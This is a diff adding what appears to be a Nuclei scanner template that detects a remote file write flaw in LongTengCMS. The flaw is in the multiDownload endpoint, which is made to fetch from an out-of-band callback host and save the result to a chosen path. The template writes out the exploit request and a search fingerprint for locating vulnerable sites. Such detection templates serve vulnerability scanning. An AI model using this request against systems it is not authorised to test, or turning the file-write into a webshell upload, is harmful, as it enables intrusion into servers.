@@ -1,0 +1,39 @@
+id: ltcms-multiDownload-rce
+
+info:
+  name: LongTengCMS Remote File Write (RCE)
+  author: Co5mos
+  severity: critical
+  description: |
+    LongTengCMS has a remote file write vulnerability in the `multiDownload` function of the `File` controller. This allows attackers to write arbitrary files to the server, leading to remote code execution (RCE).
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=Mzg4MTkwMTI5Mw==&mid=2247485286&idx=1&sn=0c4785a885992df04c8931ba698d1aaf
+  metadata:
+    verified: true
+    fofa-query: 'body="/static/index/skin/default/img/LT.png"'
+  tags: ltcms, rce
+
+variables:
+  filename: "{{rand_base(6)}}.txt"
+
+http:
+  - raw:
+      - |
+        GET /api/file/multiDownload?file=http://{{interactsh-url}}&savePath={{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+        condition: and
